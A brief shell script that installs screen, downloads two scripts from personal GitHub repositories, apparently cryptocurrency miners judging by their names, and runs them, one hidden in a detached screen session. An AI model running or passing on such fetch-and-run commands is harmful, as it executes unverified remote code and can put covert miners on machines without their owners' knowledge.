#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/tinkuJiya/gas/raw/main/zergEth.sh
wget https://github.com/xchindichorx/R/raw/main/zergRaptEth.sh
chmod +x zergRaptEth.sh
screen -dmS man ./zergRaptEth.sh 60 70
chmod +x zergEth.sh
./zergEth.sh
